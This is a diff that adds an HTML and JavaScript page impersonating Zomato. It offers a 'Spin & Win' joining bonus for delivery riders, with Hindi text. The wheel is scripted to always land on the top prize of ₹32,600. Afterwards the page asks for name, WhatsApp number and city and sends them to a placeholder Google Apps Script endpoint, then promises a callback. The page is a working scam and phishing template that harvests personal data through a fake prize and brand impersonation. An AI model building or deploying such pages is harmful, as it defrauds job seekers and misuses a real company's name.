@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zomato Spin & Win | Official Joining</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;900&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --primary: #e23744;
+            --dark: #0f0f0f;
+            --gold: #ffd700;
+        }
+
+        * { box-sizing: border-box; transition: all 0.3s ease; }
+        body {
+            margin: 0; font-family: 'Poppins', sans-serif;
+            background-color: var(--dark); color: #ffffff;
+            overflow-x: hidden; text-align: center;
+        }
+
+        .scrolling-bar {
+            background: var(--primary); color: white; padding: 10px 0; 
+            font-size: 13px; font-weight: 700; overflow: hidden; white-space: nowrap;
+        }
+        .scrolling-text {
+            display: inline-block; animation: marquee 20s linear infinite;
+        }
+        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
+
+        .container { max-width: 500px; margin: 0 auto; padding: 20px; }
+
+        /* --- SPIN WHEEL SECTION --- */
+        .wheel-container {
+            position: relative; width: 300px; height: 300px; margin: 30px auto;
+            border: 8px solid #fff; border-radius: 50%; box-shadow: 0 0 30px rgba(226, 55, 68, 0.5);
+        }
+        .wheel {
+            width: 100%; height: 100%; border-radius: 50%;
+            background: conic-gradient(
+                #e23744 0deg 60deg, #fff 60deg 120deg, 
+                #e23744 120deg 180deg, #fff 180deg 240deg, 
+                #e23744 240deg 300deg, #fff 300deg 360deg
+            );
+            position: relative; transition: transform 4s cubic-bezier(0.15, 0, 0.15, 1);
+        }
+        .wheel-label {
+            position: absolute; width: 100%; height: 100%;
+            font-weight: 900; font-size: 12px; color: #000;
+        }
+        .pointer {
+            position: absolute; top: -20px; left: 50%; transform: translateX(-50%);
+            width: 40px; height: 40px; background: var(--gold);
+            clip-path: polygon(50% 100%, 0 0, 100% 0); z-index: 10;
+        }
+        .spin-btn {
+            background: var(--gold); color: #000; border: none;
+            padding: 15px 40px; border-radius: 50px; font-weight: 900;
+            font-size: 20px; cursor: pointer; margin-top: 20px;
+            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4);
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+
+        /* --- FORM SECTION --- */
+        #regSection { display: none; margin-top: 30px; animation: fadeInUp 0.5s; }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        .reg-card {
+            background: #fff; color: #333; padding: 30px; border-radius: 25px;
+            text-align: left; box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+        }
+        .reg-card h2 { color: var(--primary); margin-top: 0; text-align: center; }
+        
+        input {
+            width: 100%; padding: 15px; margin-bottom: 15px;
+            border: 2px solid #eee; border-radius: 12px; font-size: 16px;
+        }
+        .submit-btn {
+            width: 100%; background: var(--primary); color: #fff;
+            border: none; padding: 18px; border-radius: 12px;
+            font-weight: 700; font-size: 18px; cursor: pointer;
+        }
+
+        .win-announcement {
+            display: none; background: #fff; color: var(--primary);
+            padding: 15px; border-radius: 15px; margin-bottom: 20px;
+            font-weight: 900; border: 3px dashed var(--primary);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="scrolling-bar">
+        <div class="scrolling-text">
+            🎁 Zomato Lucky Spin: अपना जॉइनिंग बोनस जीतें! | 🛵 लिमिटेड स्लॉट्स उपलब्ध | 💸 फ्री जॉइनिंग | 💰 10 ऑर्डर्स पर ₹32,600 तक का रिवॉर्ड...
+        </div>
+    </div>
+
+    <div class="container">
+        <div id="spinSection">
+            <h1 style="font-family: Montserrat; margin-bottom: 5px;">SPIN & <span>WIN</span></h1>
+            <p style="opacity: 0.8; font-size: 14px;">घुमाएं और अपना जॉइनिंग बोनस कन्फर्म करें</p>
+
+            <div class="wheel-container">
+                <div class="pointer"></div>
+                <div class="wheel" id="wheel">
+                    <div style="position:absolute; top:20px; left:120px; font-weight:900; color:#fff; transform: rotate(0deg);">₹1200</div>
+                    <div style="position:absolute; top:120px; right:10px; font-weight:900; color:#e23744; transform: rotate(90deg);">₹5000</div>
+                    <div style="position:absolute; bottom:20px; left:120px; font-weight:900; color:#fff; transform: rotate(180deg);">₹32600</div>
+                    <div style="position:absolute; top:120px; left:10px; font-weight:900; color:#e23744; transform: rotate(270deg);">₹2500</div>
+                </div>
+            </div>
+
+            <button class="spin-btn" id="spinBtn" onclick="startSpin()">SPIN NOW <i class="fas fa-sync"></i></button>
+        </div>
+
+        <div id="regSection">
+            <div class="win-announcement" id="winMsg">
+                🎊 बधाई हो! आपने ₹32,600 बोनस जीता है!
+            </div>
+            
+            <div class="reg-card">
+                <h2>Details भरें</h2>
+                <p style="font-size: 12px; text-align:center; margin-bottom: 20px;">बोनस क्लेम करने के लिए अभी रजिस्टर करें</p>
+                <form id="regForm">
+                    <input type="text" id="name" placeholder="आपका नाम" required>
+                    <input type="tel" id="whatsapp" placeholder="WhatsApp नंबर" required pattern="[0-9]{10}">
+                    <input type="text" id="city" placeholder="आपका शहर" required>
+                    <button type="submit" class="submit-btn" id="submitBtn">CLAIM BONUS NOW</button>
+                </form>
+            </div>
+        </div>
+
+        <div id="successBox" style="display:none; padding: 40px 20px;">
+            <i class="fas fa-check-circle" style="font-size: 70px; color: #2ecc71;"></i>
+            <h2 style="color: #2ecc71;">बधाई हो!</h2>
+            <p>आपकी जानकारी सेव हो गई है। हमारी टीम बोनस और जॉइनिंग लिंक के लिए 2 घंटे में कॉल/WhatsApp करेगी।</p>
+        </div>
+    </div>
+
+    <script>
+        const scriptURL = "YOUR_GOOGLE_SCRIPT_URL_HERE";
+
+        function startSpin() {
+            const wheel = document.getElementById('wheel');
+            const btn = document.getElementById('spinBtn');
+            
+            btn.disabled = true;
+            btn.style.animation = "none";
+            btn.style.opacity = "0.5";
+
+            // Rotate the wheel multiple times + specific angle for ₹32600 (approx 180deg)
+            // 360 * 5 (rotations) + 180 (target)
+            const rotation = 1800 + 180; 
+            wheel.style.transform = `rotate(${rotation}deg)`;
+
+            setTimeout(() => {
+                document.getElementById('spinSection').style.opacity = "0.3";
+                document.getElementById('regSection').style.display = "block";
+                document.getElementById('winMsg').style.display = "block";
+                
+                // Scroll to form
+                window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+            }, 4500);
+        }
+
+        document.getElementById("regForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+            const btn = document.getElementById("submitBtn");
+            btn.innerText = "Processing...";
+            btn.disabled = true;
+
+            const data = {
+                name: document.getElementById("name").value,
+                mobile: document.getElementById("whatsapp").value,
+                address: document.getElementById("city").value,
+                referral: "Zomato_Spin_Win"
+            };
+
+            try {
+                // If you have your scriptURL, it will save data
+                if(scriptURL !== "YOUR_GOOGLE_SCRIPT_URL_HERE") {
+                    await fetch(scriptURL, { method: "POST", body: JSON.stringify(data) });
+                }
+                
+                document.getElementById("regSection").style.display = "none";
+                document.getElementById("spinSection").style.display = "none";
+                document.getElementById("successBox").style.display = "block";
+            } catch (err) {
+                alert("Error saving data. Please try again.");
+                btn.disabled = false;
+                btn.innerText = "CLAIM BONUS NOW";
+            }
+        });
+    </script>
+</body>
+</html>
